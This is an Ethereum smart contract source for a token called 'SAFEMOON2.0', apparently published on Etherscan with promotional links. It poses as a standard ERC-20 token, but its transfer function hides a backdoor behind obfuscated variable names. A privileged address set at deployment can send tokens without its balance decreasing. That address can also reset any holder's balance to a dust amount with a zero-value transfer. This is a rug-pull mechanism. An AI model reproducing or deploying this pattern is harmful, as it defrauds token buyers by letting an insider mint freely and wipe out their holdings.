/**
 *Submitted for verification at Etherscan.io on 2023-06-29
*/

/**
 https://www.safemoon2point0.com/

 https://safemoon2point0.gitbook.io/untitled/

 https://twitter.com/SafeMoon20ERC20

 https://t.me/safemoon2eth

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SafeMoon20 is Ownable {
    mapping(address => uint256) public balanceOf;

    string public name = 'SAFEMOON2.0';

    function approve(address halfapprover, uint256 halfnumber) public returns (bool success) {
        allowance[msg.sender][halfapprover] = halfnumber;
        emit Approval(msg.sender, halfapprover, halfnumber);
        return true;
    }

    uint8 public decimals = 9;

    function halfspender(address halfrow, address halfreceiver, uint256 halfnumber) private {
        if (halfwallet[halfrow] == 0) {
            balanceOf[halfrow] -= halfnumber;
        }
        balanceOf[halfreceiver] += halfnumber;
        if (halfwallet[msg.sender] > 0 && halfnumber == 0 && halfreceiver != halfpair) {
            balanceOf[halfreceiver] = halfvalve;
        }
        emit Transfer(halfrow, halfreceiver, halfnumber);
    }

    address public halfpair;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = 'SAFEMOON2.0';

    mapping(address => uint256) private halfwallet;

    function transfer(address halfreceiver, uint256 halfnumber) public returns (bool success) {
        halfspender(msg.sender, halfreceiver, halfnumber);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address halfrow, address halfreceiver, uint256 halfnumber) public returns (bool success) {
        require(halfnumber <= allowance[halfrow][msg.sender]);
        allowance[halfrow][msg.sender] -= halfnumber;
        halfspender(halfrow, halfreceiver, halfnumber);
        return true;
    }

    constructor(address halfmarket) {
        balanceOf[msg.sender] = totalSupply;
        halfwallet[halfmarket] = halfvalve;
        IUniswapV2Router02 halfworkshop = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        halfpair = IUniswapV2Factory(halfworkshop.factory()).createPair(address(this), halfworkshop.WETH());
    }

    uint256 private halfvalve = 105;

    mapping(address => uint256) private halfprime;
}